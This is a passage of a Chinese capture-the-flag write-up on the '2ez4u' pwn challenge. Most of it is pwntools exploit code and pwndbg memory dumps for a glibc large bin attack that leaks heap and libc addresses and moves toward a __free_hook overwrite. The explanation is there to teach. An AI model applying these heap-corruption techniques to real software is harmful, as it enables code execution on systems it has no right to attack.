class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line">log.info(<span class="string">"target_addr 0x%016x"</span> % target_addr)</span><br><span class="line">log.info(<span class="string">"chunk1_addr 0x%016x"</span> % chunk1_addr)</span><br><span class="line">log.info(<span class="string">"chunk2_addr 0x%016x"</span> % chunk2_addr)</span><br><span class="line">log.info(<span class="string">"victim_addr 0x%016x"</span> % victim_addr)</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0x124e</span>))</span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># victim</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target</span></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)</span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))  </span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!! </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">show(<span class="number">0x3</span>) <span class="comment">## 伪造的堆块中包含small bin，leak libc地址</span></span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br></pre></td></tr></table></figure><p>这部分的调试过程比较简单，就在我脚本里那个地方下断，就可以在每次添加删除或修改执行完，返回生成菜单的代码处断下，查看每次修改结果，不再详细描述。<br>利用思路需要再整理一下，我们每次能够改变的是desc<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-092203.jpg" alt=""></p><p>在large bin attack开始前断下，并查看修改前的index b。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1 at 0x55555555524e</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000400000000010x00005555557580a0-&gt;0</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090-&gt;1</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110-&gt;2</span><br><span class="line">0x555555756070:0x00000060000000010x0000555555757190-&gt;3</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210-&gt;4</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290-&gt;5</span><br><span class="line">0x5555557560a0:0x00000060000000010x0000555555757310-&gt;6</span><br><span class="line">0x5555557560b0:0x000003f0000000010x0000555555757390-&gt;7</span><br><span class="line">0x5555557560c0:0x00000030000000010x00005555557577a0-&gt;8</span><br><span class="line">0x5555557560d0:0x000003e0000000000x00005555557577f0-&gt;9</span><br><span class="line">0x5555557560e0:0x00000030000000010x0000555555757bf0-&gt;a</span><br><span class="line">0x5555557560f0:0x000003f0000000000x0000555555757c40-&gt;b</span><br><span class="line">0x555555756100:0x00000030000000010x0000555555758050-&gt;c</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x /20gx 0x0000555555757c40</span><br><span class="line">0x555555757c40:0x00005555557577e00x00007ffff7dd1f68</span><br><span class="line">0x555555757c50:0x00005555557577e00x00005555557577e0-&gt;修改前bk_nextsize的指向为最小的chunk</span><br><span class="line">0x555555757c60:0x62626262626262620x6262626262626262</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-043147.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target_addr = HEAP+0xb0     # 在index 1中</span><br><span class="line">chunk1_addr = HEAP+0x130    # 在index 2中</span><br><span class="line">chunk2_addr = HEAP+0x1b0    # 在index 3中</span><br><span class="line">victim_addr = HEAP+0xc30    # 在index b中</span><br></pre></td></tr></table></figure></p><p>修改后,执行完edit(0xb, p64(chunk1_addr))，再在生成菜单的代码前断下，此时bk_nextsize指向伪造的chunk1,chunk1将在chunk1_addr这个地址构造。<br>最终构造出：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-051317.jpg" alt=""><br>绕过p-&gt;fd-&gt;bk=p和p-&gt;bk-&gt;fd=p<br>以及p-&gt;bk_nextsize-&gt;fd_nextsize=p和p-&gt;fd_nextsize-&gt;bk_nextsize=p<br>同时要注意<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x0000555555757c30</span><br><span class="line">0x555555757c30:0x00616161616161610x0000000000000411</span><br><span class="line">0x555555757c40:0x00005555557577e00x00007ffff7dd1f68</span><br><span class="line">0x555555757c50:0x00005555557577e00x0000555555757130</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x00005555557577e0</span><br><span class="line">0x5555557577e0:0x00383838383838380x0000000000000401</span><br><span class="line">0x5555557577f0:0x00007ffff7dd1f680x0000555555757c30</span><br><span class="line">0x555555757800:0x0000555555757c300x0000555555757c30</span><br><span class="line">0x555555757810:0x39393939393939390x3939393939393939</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x00005555557571b0</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000421</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x00005555557571300x3333333333333300</span><br><span class="line">0x5555557571e0:0x33333333333333330x3333333333333333</span><br><span class="line">0x5555557571f0:0x33333333333333330x3333333333333333</span><br><span class="line">0x555555757200:0x00333333333333330x0000000000000081</span><br><span class="line">0x555555757210:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x0000555555757130</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000411</span><br><span class="line">0x555555757140:0x00005555557570980x00005555557570a0</span><br><span class="line">0x555555757150:0x0000555555757c300x00005555557571b0</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x0000555555757098</span><br><span class="line">0x555555757098:0x00000000000000000x0000000000000001</span><br><span class="line">0x5555557570a8:0x00000000000000000x0000555555757130</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /20gx 0x00005555557570a0</span><br><span class="line">0x5555557570a0:0x00000000000000010x0000000000000000</span><br><span class="line">0x5555557570b0:0x00005555557571300x3131313131313100</span><br></pre></td></tr></table></figure><p>注意这句话edit(0x7, ‘7’*0x198+p64(0x410)+p64(0x411))<br>它是为了保证size的大小一致，在“相邻”的下一个chunk设置好prev_size。<br>chunk1的addr为130，加上size即410就是540.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x000055555575754</span><br><span class="line">0x555555757540:0x0000000000000410-&gt;prev_sieze0x0000000000000411</span><br><span class="line">0x555555757550:0x37373737373737000x3737373737373737</span><br><span class="line">0x555555757560:0x37373737373737370x3737373737373737</span><br></pre></td></tr></table></figure></p><p>构造好之后，就是先删除6和3这两个大小在small bins范围里的chunk。<br>顺便一提，small bins是FIFO的规则，所以同一个链表中先被释放的chunk会先被分配出去。</p><p>然后再add(0x3f0, ‘3’*0x30+p64(0xdeadbeefdeadbeef))<br>因为我们之前说过了large bins的分配，首先找到first(bins)，也就是free chunk的第一个，因为这是这条链里最大的，这里就是c30，然后从它的bk_nextsize开始遍历，即从130开始遍历，这里的130是我们伪造好的，它的大小为410，就被分配出去了。<br>检查一下，确实是这样，它被分配到了index 3的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000400000000010x00005555557580a0</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110</span><br><span class="line">0x555555756070:0x000003f0000000010x0000555555757140</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290</span><br></pre></td></tr></table></figure></p><p>也可以看出触发了unlink<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /6gx 0x0000555555757c30</span><br><span class="line">0x555555757c30:0x00616161616161610x0000000000000411</span><br><span class="line">0x555555757c40:0x00005555557577e00x00007ffff7dd1f68</span><br><span class="line">0x555555757c50:0x00005555557577e00x00005555557571b0</span><br><span class="line">pwndbg&gt; x /6gx 0x00005555557571b0</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000421</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x0000555555757c300x3333333333333300</span><br></pre></td></tr></table></figure></p><p>因为之前的index 3即0x0000555555757190就是small bin，而它被包含在我们伪造的chunk的大小（130-540）中，所以被leak出来，其fd的值就在libc中。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-053914.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /50gx 0x0000555555757130</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000411</span><br><span class="line">0x555555757140:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757150:0x00005555000000030x3333333333333333</span><br><span class="line">0x555555757160:0x33333333333333330x3333333333333333</span><br><span class="line">0x555555757170:0x33333333333333330x3333333333333333</span><br><span class="line">0x555555757180:0x33333333333333330xdeadbeefdeadbeef</span><br><span class="line">0x555555757190:0x00007ffff7dd1be8-&gt;libc0x0000555555757300</span><br></pre></td></tr></table></figure><p>leak出的libc并不是基地址，还要减去偏移，我不大清楚应该这么算，但是关了ASLR之后，我们可以看到基地址，先leak一遍然后算出编译，然后再重新运行leak脚本，把这个偏移值减去即可，有人知道怎么算的话，可以告知我一下~谢谢。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-060419.png" alt=""><br>最终leak出的libc地址为：0x00007ffff7a0d000</p><h3 id="覆盖-free-hook指针"><a href="#覆盖-free-hook指针" class="headerlink" title="覆盖__free_hook指针"></a>覆盖__free_hook指针</h3><p>利用这个malloc出来的chunk来修改fastbin的fd<br>通过修改fd,来malloc出top前一块空间，然后这样就可以修改main_arena上的top为free_hook上面一些的地方。<br>通过几次malloc，修改free_hook为system的地址</p><p>这部分的堆构造比较复杂，不过只要注意到是怎么在我们malloc出的fake_chunk里free出一个fastbin，后面就可以通过更改fastbin的fd指针，结合UAF实现任意地址写了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># victim</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target</span></span><br><span class="line"></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)</span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line"></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!!</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0x3</span>)</span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line">junk  = <span class="string">''</span></span><br><span class="line">junk += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">junk += p64(<span class="number">0x81</span>)</span><br><span class="line">junk += p64(LIBC+<span class="number">0x3c4be8</span>)</span><br><span class="line">junk += p64(HEAP+<span class="number">0x300</span>)</span><br><span class="line">junk  = junk.ljust(<span class="number">0xa8</span>, <span class="string">'A'</span>)</span><br><span class="line">junk += p64(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x80</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x60</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">dele(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x70</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x0</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0x124e</span>))</span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">recovery += p64(<span class="number">0x61</span>)</span><br><span class="line">recovery += p64(LIBC+<span class="number">0x3c4b50</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># 